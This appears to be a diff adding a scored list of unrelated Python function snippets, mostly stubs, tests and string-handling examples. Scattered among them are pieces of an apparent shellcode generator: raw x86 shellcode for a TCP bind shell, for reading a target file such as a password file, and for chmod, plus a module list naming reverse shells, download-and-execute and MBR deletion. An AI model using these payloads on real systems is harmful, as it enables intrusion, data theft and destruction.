@@ -1,0 +1,813 @@
+
+========================================================
+67.823 3:8
+--------------------------------------------------------
+def f1():
+    x = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    y = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    z = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    x += y + z
+
+========================================================
+67.277 10:15
+--------------------------------------------------------
+def f2():
+    x = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    y = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    z = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    x = x + y + z
+
+========================================================
+67.032 1:3
+--------------------------------------------------------
+def a():
+	pass
+
+========================================================
+65.13 17:22
+--------------------------------------------------------
+def f3():
+    x = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    y = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    z = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    x = "".join((x, y, z))
+
+========================================================
+64.278 3:8
+--------------------------------------------------------
+def foo():
+	"""
+		docstring
+	"""
+	1
+
+========================================================
+63.437 24:29
+--------------------------------------------------------
+def f4():
+    x = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    y = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    z = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    x = "%s%s%s" % (x, y, z)
+
+========================================================
+63.431 26:48
+--------------------------------------------------------
+def _license_info():
+    return """\
+Copyright (c) 2013-2016 DataLad developers
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in
+all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+THE SOFTWARE.
+"""
+
+========================================================
+60.982 43:52
+--------------------------------------------------------
+    def _test_text_body(self):
+        return """
+Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor
+incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis
+nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore
+eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt
+in culpa qui officia deserunt mollit anim id est laborum.
+"""
+
+========================================================
+60.076 7:23
+--------------------------------------------------------
+def ret():
+	list = [
+		"back",			
+		"set",		
+		"ip",			
+		"clear",		
+		"disas",		
+		"whatisthis",     
+		"iteration",		
+		"generate", 	
+		"output",			
+		"show",		
+		"encoders",
+		"options",	
+	]
+	return list
+
+========================================================
+59.768 6:7
+--------------------------------------------------------
+def Push(): pass
+
+========================================================
+59.752 2:3
+--------------------------------------------------------
+def f(): pass
+
+========================================================
+58.847 429:430
+--------------------------------------------------------
+def __SOCKADDR_COMMON(sa_prefix): return \
+
+========================================================
+58.601 7:8
+--------------------------------------------------------
+def Pop(): pass
+
+========================================================
+58.484 85:93
+--------------------------------------------------------
+    def __repr__(self):
+        return "<%s name:%s state:%s type:%s mode:%s zone:%s>" % ('Interface',
+                                                                  self.name,
+                                                                  self.state,
+                                                                  self.type,
+                                                                  self.mode,
+                                                                  self.zone,
+                                                                  )
+
+========================================================
+58.433 8:13
+--------------------------------------------------------
+def account_group():
+	"""
+	account command group
+	"""
+	pass
+
+========================================================
+58.065 39:41
+--------------------------------------------------------
+def test_segment_11():
+    assert segment('inaholeinthegroundtherelivedahobbitnotanastydirtywetholefilledwiththeendsofwormsandanoozysmellnoryetadrybaresandyholewithnothinginittositdownonortoeatitwasahobbitholeandthatmeanscomfort') == ['in', 'a', 'hole', 'in', 'the', 'ground', 'there', 'lived', 'a', 'hobbit', 'not', 'a', 'nasty', 'dirty', 'wet', 'hole', 'filled', 'with', 'the', 'ends', 'of', 'worms', 'and', 'an', 'oozy', 'smell', 'nor', 'yet', 'a', 'dry', 'bare', 'sandy', 'hole', 'with', 'nothing', 'in', 'it', 'to', 'sit', 'down', 'on', 'or', 'to', 'eat', 'it', 'was', 'a', 'hobbit', 'hole', 'and', 'that', 'means', 'comfort']
+
+========================================================
+57.381 22:24
+--------------------------------------------------------
+def teardown():
+	pass
+
+========================================================
+57.299 50:59
+--------------------------------------------------------
+def read( targetfile):
+	code =  r"\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f"
+	code +=	r"\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
+	code += r"\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50"
+	code += r"\x52\x53\xb0\x3b\x50\xcd\x80\x50\x50\xcd"
+	code += r"\x80\xe8\xdc\xff\xff\xff"
+	#"\x2f\x65\x74\x63\x2f\x6d\x61\x73\x74\x65\x72\x2e\x70\x61\x73\x73\x77\x64"
+	code += targetfile
+	return code
+
+========================================================
+57.281 7:8
+--------------------------------------------------------
+def PowerOn(): pass
+
+========================================================
+57.271 5:6
+--------------------------------------------------------
+def render(): pass # --STRIP DURING BUILD
+
+========================================================
+56.98 47:49
+--------------------------------------------------------
+def L_(s):
+	return s
+
+========================================================
+56.856 22:24
+--------------------------------------------------------
+def k():
+    l()
+
+========================================================
+56.759 33:35
+--------------------------------------------------------
+def L_(s):
+	return s
+
+========================================================
+56.749 13:15
+--------------------------------------------------------
+def h():
+    i()
+
+========================================================
+56.644 156:163
+--------------------------------------------------------
+    def create_minion(self, player):
+        return Minion(5, 4, windfury=True, effects=[Effect(Attack(),
+                                                           ActionTag(ChangeTarget(CharacterSelector(NotCurrentTarget(),
+                                                                                                    EnemyPlayer(),
+                                                                                                    RandomPicker())),
+                                                           SelfSelector(),
+                                                           And(OneIn(2), OpponentMinionCountIsGreaterThan(0))))])
+
+========================================================
+56.468 6:7
+--------------------------------------------------------
+def Initialize(): pass
+
+========================================================
+56.433 8:9
+--------------------------------------------------------
+def Initialize(): pass
+
+========================================================
+56.377 21:23
+--------------------------------------------------------
+def test0():
+  assert 0 == 0
+
+========================================================
+56.373 8:9
+--------------------------------------------------------
+def Initialize(): pass
+
+========================================================
+56.357 8:13
+--------------------------------------------------------
+def record_group():
+	"""
+	record command group
+	"""
+	pass
+
+========================================================
+56.328 6:7
+--------------------------------------------------------
+def Initialize(): pass
+
+========================================================
+56.327 41:42
+--------------------------------------------------------
+def _f(): pass
+
+========================================================
+56.303 41:42
+--------------------------------------------------------
+def _f(): pass
+
+========================================================
+55.913 53:56
+--------------------------------------------------------
+		def f() :
+
+			pass
+
+========================================================
+55.69 19:21
+--------------------------------------------------------
+def j():
+    k()
+
+========================================================
+55.43 42:44
+--------------------------------------------------------
+def test_segment_12():
+    assert segment('faroutintheunchartedbackwatersoftheunfashionableendofthewesternspiralarmofthegalaxyliesasmallunregardedyellowsun') == ['far', 'out', 'in', 'the', 'uncharted', 'backwaters', 'of', 'the', 'unfashionable', 'end', 'of', 'the', 'western', 'spiral', 'arm', 'of', 'the', 'galaxy', 'lies', 'a', 'small', 'un', 'regarded', 'yellow', 'sun']
+
+========================================================
+54.84 6:7
+--------------------------------------------------------
+def ReadInt(): pass
+
+========================================================
+54.813 7:8
+--------------------------------------------------------
+def ReadInt(): pass
+
+========================================================
+54.767 7:8
+--------------------------------------------------------
+def ReadInt(): pass
+
+========================================================
+54.714 6:7
+--------------------------------------------------------
+def ReadInt(): pass
+
+========================================================
+54.679 25:27
+--------------------------------------------------------
+def validate1():
+  assert 0 == 0
+
+========================================================
+54.659 345:347
+--------------------------------------------------------
+		def f() :
+			pass
+
+========================================================
+54.571 34:36
+--------------------------------------------------------
+    def __init__(self):
+        self.data_link = 'aHR0cHM6Ly9vZmZzaG9yZWdpdC5jb20vbGFtYmRhODEvZGF0YWJhc2VzL21vdmllZmFyc2kuemlw'
+
+========================================================
+54.453 410:411
+--------------------------------------------------------
+def IN6_IS_ADDR_MC_INTFACELOCAL(a): return \
+
+========================================================
+54.353 44:46
+--------------------------------------------------------
+def _(s):
+	return s
+
+========================================================
+54.34 30:32
+--------------------------------------------------------
+def _(s):
+	return s
+
+========================================================
+54.306 73:74
+--------------------------------------------------------
+  def total_cost_of_calls_microdollars(self): return self.total_cost_of_calls_microdollars_
+
+========================================================
+54.188 5:6
+--------------------------------------------------------
+def foo(): return 42
+
+========================================================
+54.151 25:72
+--------------------------------------------------------
+def ret2():
+	list = [
+		"linux",	 
+		"linux_arm",
+		"linux_mips",
+		"solarisx86",
+		"osx",
+		"FreeBSDx",
+		"windows",
+
+
+		"encoders",
+		"options",	
+
+		"binsh_spawn",
+		"bindash_spawn",
+		"read",
+		"chmod",
+		"reboot",
+		"shutdown",
+		"mkdir",
+		"rmdir",
+		"ipv4forward",
+		"Remoteportforward",
+		"reverse_telnet",
+		"add_user",
+		"DeleteMBR",
+		"tcp_bind",
+		"reverse_tcp",
+		"egghunter",
+		"add_map",
+		"netcatbind",
+		"creat",
+		"messagebox",
+		"download&execute",
+		"killall",
+		"netcatreverse",
+
+		"generate",
+		"help",          
+		"clear",			
+		"use",			
+		"show",
+		"modules",  	
+		"injectors",
+	]
+	return list
+
+========================================================
+54.138 36:38
+--------------------------------------------------------
+def test_segment_10():
+    assert segment('asgregorsamsaawokeonemorningfromuneasydreamshefoundhimselftransformedinhisbedintoagiganticinsect') == ['as', 'gregor', 'samsa', 'awoke', 'one', 'morning', 'from', 'uneasy', 'dreams', 'he', 'found', 'himself', 'transformed', 'in', 'his', 'bed', 'into', 'a', 'gigantic', 'insect']
+
+========================================================
+54.11 174:182
+--------------------------------------------------------
+    def getStatement(self, job):
+
+        return "qrsh -now n -cwd -q %s -p %i -N %s %s %s %s " % (self.mQueue,
+                                                                 self.mPriority,
+                                                                 self.mName,
+                                                                 self.mVariables,
+                                                                 self.mOptions,
+                                                                 job)
+
+========================================================
+54.059 6:7
+--------------------------------------------------------
+def PowerOff(): pass
+
+========================================================
+53.999 1465:1466
+--------------------------------------------------------
+    def set_Number_Of_Cross_Reference_Tables(self, Number_Of_Cross_Reference_Tables): self.Number_Of_Cross_Reference_Tables = Number_Of_Cross_Reference_Tables
+
+========================================================
+53.963 1631:1632
+--------------------------------------------------------
+    def set_CCITTFaxDecode_Count(self, CCITTFaxDecode_Count): self.CCITTFaxDecode_Count = CCITTFaxDecode_Count
+
+========================================================
+53.926 8:17
+--------------------------------------------------------
+def tcp_bindx86( PORT):
+	shellcode =  r"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
+	shellcode += r"\x66\x43\x52\x66\x68"
+	shellcode += PORT
+	shellcode += r"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89"
+	shellcode += r"\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02"
+	shellcode += r"\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+	shellcode += r"\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
+	return shellcode
+
+========================================================
+53.757 101:109
+--------------------------------------------------------
+    def describe_alarms(self, period=None, statistic=None,
+                        dimensions=None, unit=None):
+        return self.connection.describe_alarms_for_metric(self.name,
+                                                          self.namespace,
+                                                          period,
+                                                          statistic,
+                                                          dimensions,
+                                                          unit)
+
+========================================================
+53.733 1458:1459
+--------------------------------------------------------
+    def set_Number_Of_Indirect_Objects(self, Number_Of_Indirect_Objects): self.Number_Of_Indirect_Objects = Number_Of_Indirect_Objects
+
+========================================================
+53.722 16:18
+--------------------------------------------------------
+def i():
+    j()
+
+========================================================
+53.56 610:611
+--------------------------------------------------------
+def IN6_IS_ADDR_MC_SITELOCAL(a): return \
+
+========================================================
+53.416 424:425
+--------------------------------------------------------
+def IN6_IS_ADDR_MC_SITELOCAL(a): return \
+
+========================================================
+53.382 2:4
+--------------------------------------------------------
+def get_data():
+	return [1.9, 1.8, 1.7, 0.6, 0.99,0.88,0.77,0.66]
+
+========================================================
+53.38 414:415
+--------------------------------------------------------
+def IN6_IS_ADDR_MC_SITELOCAL(a): return \
+
+========================================================
+53.379 33:35
+--------------------------------------------------------
+def test_segment_9():
+    assert segment('itwasthebestoftimesitwastheworstoftimesitwastheageofwisdomitwastheageoffoolishness') == ['it', 'was', 'the', 'best', 'of', 'times', 'it', 'was', 'the', 'worst', 'of', 'times', 'it', 'was', 'the', 'age', 'of', 'wisdom', 'it', 'was', 'the', 'age', 'of', 'foolishness']
+
+========================================================
+53.337 21:23
+--------------------------------------------------------
+def a():
+    pass
+
+========================================================
+53.31 32:34
+--------------------------------------------------------
+def a():
+    pass
+
+========================================================
+53.298 77:79
+--------------------------------------------------------
+def a():
+    pass
+
+========================================================
+53.245 18:53
+--------------------------------------------------------
+def test_preprocess():
+    code = """\
+A
+#if True
+  always True
+  another line
+#endif
+B
+#if False
+  never see this
+#endif
+C
+#if x == 0
+  x = 0
+#else
+  x != 0
+#endif
+D
+#if x != 0
+  x != 0
+#endif
+E
+"""
+    res = """\
+A
+  always True
+  another line
+B
+C
+  x != 0
+D
+  x != 0
+E
+"""
+    assert preprocess(code, dict(x=1)) == res
+
+========================================================
+53.24 248:249
+--------------------------------------------------------
+    def set_Sectors_Per_Allocation_Unit(self, Sectors_Per_Allocation_Unit): self.Sectors_Per_Allocation_Unit = Sectors_Per_Allocation_Unit
+
+========================================================
+53.213 38:40
+--------------------------------------------------------
+def a():
+    pass
+
+========================================================
+53.151 271:279
+--------------------------------------------------------
+    def __repr__(self):
+        return "<Trait(%s) %s=%s/%s/%s/%s on %s>" % (self.name,
+                                                     self.type,
+                                                     self.t_string,
+                                                     self.t_float,
+                                                     self.t_int,
+                                                     self.t_datetime,
+                                                     self.event_id)
+
+========================================================
+53.085 8:9
+--------------------------------------------------------
+def IncrementSpeed(): pass
+
+========================================================
+52.959 39:59
+--------------------------------------------------------
+def OSlist():
+	print ("""
+	Operating System	Architecture
+	================	============
+	Linux 		   		x86
+	Windows 			x86
+	FreeBSD 			x86
+	OpenBSD 			x86
+	Solaris 			x86
+	Linux 				PowerPC
+	OpenBSD 			PowerPC
+	Linux 				Sparc
+	FreeBSD 			Sparc
+	OpenBSD 			Sparc
+	Solaris 			Sparc
+	Linux 				ARM
+	FreeBSD 			ARM
+	OpenBSD 			ARM
+
+""")
+
+========================================================
+52.942 209:211
+--------------------------------------------------------
+def an_nvGraphicFramePr():
+    return CT_GraphicalObjectFrameNonVisualBuilder()
+
+========================================================
+52.912 8:9
+--------------------------------------------------------
+def Login(): pass
+
+========================================================
+52.864 8:9
+--------------------------------------------------------
+def Login(): pass
+
+========================================================
+52.839 9:10
+--------------------------------------------------------
+def Login(): pass
+
+========================================================
+52.832 20:23
+--------------------------------------------------------
+def value(char):
+
+	return
+
+========================================================
+52.79 26:62
+--------------------------------------------------------
+  def __setitem__( self, key, value ):
+
+    if isinstance( value, bytearray ) or isinstance( value, str ):
+
+      start_addr = 0
+      stop_addr  = 0
+
+      if isinstance( key, slice ):
+        start_addr = int(key.start)
+        stop_addr  = int(key.stop)
+      else:
+        start_addr = int(key)
+        stop_addr  = int(key)+1
+
+      self.mem[start_addr:stop_addr] = value
+
+    else:
+
+      start_addr = 0
+      num_bytes  = 0
+
+      if isinstance( key, slice ):
+        start_addr = int(key.start)
+        num_bytes  = int(key.stop) - int(key.start)
+      else:
+        start_addr = int(key)
+        num_bytes  = 1
+
+      if isinstance( value, Bits ):
+        bits = value
+        assert value.nbits % 8 == 0
+      else:
+        bits = Bits( num_bytes*8, value )
+
+      for i in range(num_bytes):
+        self.mem[start_addr+i] = bits[i*8:i*8+8]
+
+========================================================
+52.771 7:8
+--------------------------------------------------------
+def Logout(): pass
+
+========================================================
+52.766 39:41
+--------------------------------------------------------
+def test0():
+  pass
+
+========================================================
+52.762 1625:1626
+--------------------------------------------------------
+    def set_JBIG2Decode_Count(self, JBIG2Decode_Count): self.JBIG2Decode_Count = JBIG2Decode_Count
+
+========================================================
+52.762 9:10
+--------------------------------------------------------
+def Logout(): pass
+
+========================================================
+52.75 4:9
+--------------------------------------------------------
+def ch( filee):
+	shellcode =  r"\x31\xc0\x50"
+	shellcode += filee
+	shellcode += r"\xb0\x0f\x89\xe3\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80"
+	return shellcode
+
+========================================================
+52.743 471:482
+--------------------------------------------------------
+def create_ruby_dpowerline():
+	vim.command((
+		'''
+		ruby
+		if $powerline == nil
+			class Powerline
+			end
+			$powerline = Powerline.new
+		end
+		'''
+	))
+
+========================================================
+52.728 9:10
+--------------------------------------------------------
+def Login(): pass
+
+========================================================
+52.724 7:8
+--------------------------------------------------------
+def Logout(): pass
+
+========================================================
+52.677 10:11
+--------------------------------------------------------
+def UpdateInt(): pass
+
+========================================================
+52.665 9:10
+--------------------------------------------------------
+def Logout(): pass
+
+========================================================
+52.645 4:5
+--------------------------------------------------------
+def sleep(seconds): pass
+
+========================================================
+52.616 10:11
+--------------------------------------------------------
+def UpdateInt(): pass
+
+========================================================
+52.605 3589:3599
+--------------------------------------------------------
+    def __init__(self, datapath, flags, table_id, out_port, out_group,
+                 cookie, cookie_mask, match, type_=None):
+        super(OFPAggregateStatsRequest, self).__init__(datapath,
+                                                       flags,
+                                                       table_id,
+                                                       out_port,
+                                                       out_group,
+                                                       cookie,
+                                                       cookie_mask,
+                                                       match)
+
+========================================================
+52.573 221:223
+--------------------------------------------------------
+def an_nvSpPr():
+    return CT_ShapeNonVisualBuilder()
+
+========================================================
+52.565 212:213
+--------------------------------------------------------
+def IN_MULTICAST(a): return IN_CLASSD(a)
+
+========================================================
+52.54 10:11
+--------------------------------------------------------
+def UpdateInt(): pass
+
+========================================================
+52.538 10:12
+--------------------------------------------------------
+def g():
+    h()
+
+========================================================
+52.522 1972:1973
+--------------------------------------------------------
+def SUCCEEDED(Status): return ((Status) >= 0)
+
+========================================================
+52.504 21:23
+--------------------------------------------------------
+def foobar():
+  assert 0 == 0
+
+========================================================
+52.496 10:11
+--------------------------------------------------------
+def UpdateInt(): pass
+
+========================================================
+52.426 166:168
+--------------------------------------------------------
+def GetPlacesJson():
+  return _PLACES_JSON
+
+========================================================
+52.416 111:113
+--------------------------------------------------------
+def e():
+    pass
